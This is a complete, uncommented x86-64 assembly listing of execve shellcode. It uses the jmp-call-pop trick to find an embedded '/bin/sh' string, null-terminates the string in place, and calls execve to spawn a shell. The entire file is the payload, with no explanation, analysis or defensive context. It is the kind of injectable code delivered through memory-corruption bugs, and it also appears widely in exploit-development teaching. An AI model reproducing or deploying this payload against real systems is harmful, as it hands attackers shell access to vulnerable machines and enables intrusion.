	[BITS 64]

	global _start

_start:
	jmp getit
main:
	pop rdi
	xor rax,rax
	xor rsi,rsi
	xor rdx,rdx

	mov [rdi+7],rax

	mov al,0x3b
	syscall

getit:
	call main
	db "/bin/sh"

